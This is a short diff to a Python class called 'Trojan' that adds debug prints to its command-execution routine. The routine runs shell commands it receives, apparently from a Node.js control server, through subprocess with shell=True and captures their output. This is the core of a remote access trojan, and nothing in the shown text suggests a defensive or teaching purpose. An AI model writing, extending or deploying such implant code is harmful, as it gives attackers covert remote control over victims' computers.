@@ -68,13 +68,13 @@ class Trojan:
             print(f"[*] Failed to update status on Node.js server: {e}")
 
     def execute_command(self, command):
-        # If command is a dictionary, check type and handle accordingly
         if isinstance(command, dict):
             command_type = command.get('type')
             if command_type == 'shell':
                 shell_command = command.get('command')
                 if shell_command:
                     try:
+                        print(f"[*] Executing command: {shell_command}")  # Debug output
                         result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                         result = result.decode('utf-8')
                     except subprocess.CalledProcessError as e:
@@ -91,6 +91,7 @@ class Trojan:
         else:
             # Handle as a shell command if command is a string
             try:
+                print(f"[*] Executing command: {command}")  # Debug output
                 result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                 result = result.decode('utf-8')
             except subprocess.CalledProcessError as e:
